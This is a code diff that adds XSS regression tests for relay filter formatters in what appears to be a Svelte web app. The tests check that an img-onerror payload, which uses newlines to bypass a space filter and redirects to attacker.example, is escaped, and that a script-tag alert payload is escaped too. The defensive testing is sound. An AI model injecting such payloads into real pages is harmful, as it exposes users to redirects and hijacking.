@@ -47,7 +47,7 @@ vi.mock('$lib/stores/helpers/helpers-pubkey', () => ({
     pubkeyUserInstance: vi.fn(() => undefined)
 }));
 
-import { tableFormatters as relayFormatters } from './relays';
+import { tableFormatters as relayFormatters, filterFormatters as relayFilterFormatters } from './relays';
 import { tableFormatters as softwareFormatters } from './softwares';
 import { tableFormatters as ispFormatters } from './isps';
 
@@ -162,5 +162,30 @@ describe('XSS regression: additional relay formatters', () => {
         const out = relayFormatters.retentionPolicy([{ kinds: [1], time: 3600, count: 100 }]);
         expect(out).toContain('🔹');
         expect(out).toContain('⏳');
+    });
+});
+
+describe('XSS regression: relay filter formatters', () => {
+    it('software filter formatter escapes the newline-bypass attack payload', () => {
+        // The space-only guard in makeSoftwareReadable() rejects literal
+        // spaces but lets newlines through. Without escapeHtml, the
+        // payload reaches {@html} in DataViewFilters.svelte and the img
+        // onerror fires even when the filter pane is display:none.
+        const NEWLINE_BYPASS = `<img\nsrc=x\nonerror=location.href="https://attacker.example">`;
+        const out = relayFilterFormatters.software(NEWLINE_BYPASS);
+        expect(out).not.toContain('<img');
+        expect(out).not.toContain('onerror=');
+        expect(out).toContain('&lt;img');
+    });
+
+    it('software filter formatter escapes a script-tag payload', () => {
+        const out = relayFilterFormatters.software('strfry<script>alert(1)</script>');
+        expect(out).not.toContain('<script>');
+        expect(out).toContain('&lt;script&gt;');
+    });
+
+    it('software filter formatter returns "-" for non-string input', () => {
+        const out = relayFilterFormatters.software(42 as any);
+        expect(out).toBe('-');
     });
 });
